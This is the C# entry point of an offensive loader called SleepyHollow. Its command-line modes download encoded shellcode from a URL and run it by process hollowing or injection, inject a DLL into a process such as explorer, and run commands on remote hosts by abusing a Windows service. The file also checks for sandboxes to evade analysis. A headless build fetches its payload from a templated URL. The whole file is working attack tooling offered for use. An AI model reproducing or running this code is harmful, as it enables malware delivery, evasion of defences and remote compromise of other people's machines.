using SleepyHollow;

#if !HEADLESS
var commands = new Dictionary<string, Dictionary<string, string>>
{
    {
        "sc",
        new Dictionary<string, string>
        {
            { "payload", "path/URL to shellcode" },
            { "method", "hollow/inject" },
            { "wait", "seconds to wait before exiting" }
        }
    },
    {
        "dll",
        new Dictionary<string, string>
        {
            { "path", "path/URL to DLL" },
            { "processName", "process to inject into" }
        }
    },
    {
        "rexec",
        new Dictionary<string, string>
        {
            { "hostname", "hostname to connect to" },
            { "cmd", "command to execute" },
            { "service", "service to abuse" },
            { "raw", "execute command without prepending cmd.exe /c" }
        }
    }
};
var globalSwitches = new Dictionary<string, string>
{
    { "--skip-evasion", "do not perform sandbox evasion checks" },
    { "--debug", "enable debug logging" }
};

if (args.Length == 0)
{
    Console.WriteLine("Usage: SleepyHollow.exe <command> [options]");
    Console.WriteLine("Commands:");
    foreach (var cmd in commands)
    {
        Console.WriteLine($"  {cmd.Key}");
        foreach (var opt in cmd.Value)
        {
            Console.WriteLine($"    --{opt.Key}: {opt.Value}");
        }
    }
    Environment.Exit(0);
}

var command = args[0].ToLowerInvariant();
var options = new Dictionary<string, string> { { "command", command } };

for (var i = 0; i < args.Length; i++)
{
    var validArgs = commands[command];
    var arg = args[i];
    if (arg.StartsWith("--"))
    {
        arg = arg.Replace("--", "").ToLowerInvariant();
        if (validArgs.ContainsKey(arg))
        {
            options[arg] = args[i + 1];
        }
        else if (globalSwitches.ContainsKey(arg))
        {
            options[arg] = "true";
        }
    }
}

var debugEnabled = options.ContainsKey("debug") && options["debug"] == "true";
var skipEvasion = options.ContainsKey("skip-evasion") && options["skip-evasion"] == "true";

RuntimeConfig.IsDebugEnabled = debugEnabled;
if (!skipEvasion && EvasionCheck.Detected)
{
    Console.WriteLine("Have a nice day!");
    Environment.Exit(0);
}

switch (options["command"])
{
    case "sc":
        var url = options["payload"];
        var method = options.ContainsKey("method") ? options["method"] : "hollow";
        var wait = options.ContainsKey("wait") ? int.Parse(options["wait"]) : 0;

        if (debugEnabled)
            Console.WriteLine($"Downloading {url}...");
        var httpClient = new HttpClient();
        var data = await httpClient.GetStringAsync(url);
        if (debugEnabled)
            Console.WriteLine($"Downloaded {data.Length} bytes");
        var buf = Decoder.DecodeString(data);
        if (debugEnabled)
            Console.WriteLine($"Decrypted payload to {buf.Length} bytes");
        var inject = method?.Equals("inject", StringComparison.OrdinalIgnoreCase) ?? false;
        if (inject)
            await InjectProcess.Run(buf);
        else
            await HollowProcess.Run(buf);
        await Task.Delay(wait * 1000);
        break;
    case "dll":
        var dllName = options["path"];
        var processName =  options.ContainsKey("processName") ? options["processName"] : "explorer";
        await InjectDLL.Run(dllName, processName);
        break;
    case "rexec":
        var host = options["hostname"];
        var cmd = options["cmd"];
        var service = options.ContainsKey("service") ? options["service"] : "SensorService";
        var raw = options.ContainsKey("raw") && options["raw"] == "true";
        await RemoteExecution.Run(host, cmd, serviceName: service, rawCmd: raw);
        break;
    default:
        Console.WriteLine($"Unknown command {options["command"]}");
        break;
}

#endif

#if HEADLESS
#if DISABLE_EVASION
if (EvasionCheck.Detected)
{
    Console.WriteLine("Have a nice day!");
    Environment.Exit(0);
}
;
#endif
var httpClient = new HttpClient();
var data = await httpClient.GetStringAsync("<%URL%>");
var buf = Decoder.DecodeString(data);
#if INJECT
await InjectProcess.Run(buf);
#else
await HollowProcess.Run(buf);
#endif
#endif


